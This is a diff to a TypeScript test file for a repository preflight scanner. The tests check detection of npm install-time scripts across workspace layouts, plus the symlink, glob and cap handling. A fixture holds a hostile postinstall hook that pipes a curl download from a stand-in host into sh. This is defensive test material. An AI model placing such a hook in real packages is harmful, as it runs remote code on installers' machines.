@@ -3,10 +3,10 @@ import { mkdirSync, mkdtempSync, readdirSync, rmSync, symlinkSync, writeFileSync
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
 import { Command } from "commander";
-import { MAX_FILE_BYTES } from "../../src/collectors/repo/collect.ts";
+import { MAX_FILE_BYTES, MAX_PACKAGES, MAX_WORKSPACE_DIRS } from "../../src/collectors/repo/collect.ts";
 import { registerPreflight } from "../../src/cli/preflight.ts";
 import type { IO } from "../../src/cli/io.ts";
-import { runPreflight } from "../../src/preflight.ts";
+import { preflightTable, runPreflight } from "../../src/preflight.ts";
 
 const dirs: string[] = [];
 const tmp = () => (dirs.push(mkdtempSync(join(tmpdir(), "rh-pre-"))), dirs[dirs.length - 1]!);
@@ -116,5 +116,83 @@ describe("preflight", () => {
     await program.parseAsync(["preflight", dir], { from: "user" });
     expect(out.join("")).toContain("control_plane");
     expect(code).toBe(0);
+  });
+});
+
+const EVIL = JSON.stringify({ name: "foo", scripts: { postinstall: "curl -s https://payload.example.invalid/x | sh" } });
+const CLEAN = JSON.stringify({ name: "bar", scripts: { test: "bun test" } });
+const npmFindings = (dir: string) =>
+  runPreflight(dir).report.findings.filter((f) => f.message.startsWith("npm install-time")).map((f) => f.events[0]!.raw_ref.file);
+
+describe("preflight workspaces", () => {
+  for (const [kind, decl] of [
+    ["npm array", { "package.json": JSON.stringify({ name: "root", workspaces: ["packages/*"] }) }],
+    ["yarn object", { "package.json": JSON.stringify({ name: "root", workspaces: { packages: ["packages/**"] } }) }],
+    ["pnpm yaml", { "package.json": '{"name":"root"}', "pnpm-workspace.yaml": "packages:\n  - 'packages/*'\n  - '!**/test/**'\n" }],
+  ] as const) {
+    test(`a postinstall in a workspace package is found (${kind})`, () => {
+      const dir = tmp();
+      put(dir, { ...decl, "packages/foo/package.json": EVIL, "packages/bar/package.json": CLEAN });
+      expect(npmFindings(dir)).toEqual(["packages/foo/package.json"]);
+      expect(runPreflight(dir).report.scan.files.indexed).toBe(3);
+    });
+  }
+
+  test("the table shows the workspace path", () => {
+    const dir = tmp();
+    put(dir, { "package.json": JSON.stringify({ workspaces: ["packages/foo"] }), "packages/foo/package.json": EVIL });
+    expect(preflightTable(runPreflight(dir))).toContain("packages/foo/package.json");
+  });
+
+  test("no workspaces: nested package.json files are not read", () => {
+    const dir = tmp();
+    put(dir, { "package.json": CLEAN, "packages/foo/package.json": EVIL });
+    expect(runPreflight(dir).report.findings).toEqual([]);
+    expect(runPreflight(dir).report.scan.files.indexed).toBe(1);
+  });
+
+  test("a glob that matches nothing, a `..` glob and node_modules are ignored", () => {
+    const dir = tmp();
+    put(dir, {
+      "package.json": JSON.stringify({ workspaces: ["apps/*", "../*", "**"] }),
+      "node_modules/foo/package.json": EVIL, "packages/node_modules/x/package.json": EVIL,
+    });
+    const r = runPreflight(dir);
+    expect(r.report.findings).toEqual([]);
+    expect(r.skipped).toEqual([]);
+  });
+
+  test("a symlink pointing outside the directory is not followed", () => {
+    const dir = tmp();
+    const outside = tmp();
+    put(outside, { "pkg/package.json": EVIL, "evil.json": EVIL });
+    put(dir, { "package.json": JSON.stringify({ workspaces: ["packages/*"] }), "packages/ok/.keep": "" });
+    try {
+      symlinkSync(join(outside, "pkg"), join(dir, "packages/linked"));
+      symlinkSync(join(outside, "evil.json"), join(dir, "packages/ok/package.json"));
+    } catch {
+      return; // no symlink privilege on this machine
+    }
+    const r = runPreflight(dir);
+    expect(r.report.findings).toEqual([]);
+    expect(r.skipped).toEqual([{ path: "packages/ok/package.json", reason: "symlink outside the directory" }]);
+  });
+
+  test("the package count is capped and the cap is reported", () => {
+    const dir = tmp();
+    const files: Record<string, string> = { "package.json": JSON.stringify({ workspaces: ["p/*"] }) };
+    for (let i = 0; i <= MAX_PACKAGES; i++) files[`p/${String(i).padStart(4, "0")}/package.json`] = CLEAN;
+    put(dir, files);
+    const r = runPreflight(dir);
+    expect(r.report.scan.files.indexed).toBe(MAX_PACKAGES + 1);
+    expect(r.skipped.map((s) => s.path)).toEqual(["workspaces"]);
+  });
+
+  test("a ** glob over a huge tree stops at the directory cap and says so", () => {
+    const dir = tmp();
+    put(dir, { "package.json": JSON.stringify({ workspaces: ["**"] }) });
+    for (let i = 0; i <= MAX_WORKSPACE_DIRS; i++) mkdirSync(join(dir, "d", String(i)), { recursive: true });
+    const r = runPreflight(dir);
+    expect(r.skipped).toEqual([{ path: "workspaces", reason: `glob lists more than ${MAX_WORKSPACE_DIRS} directories, stopped there` }]);
   });
 });
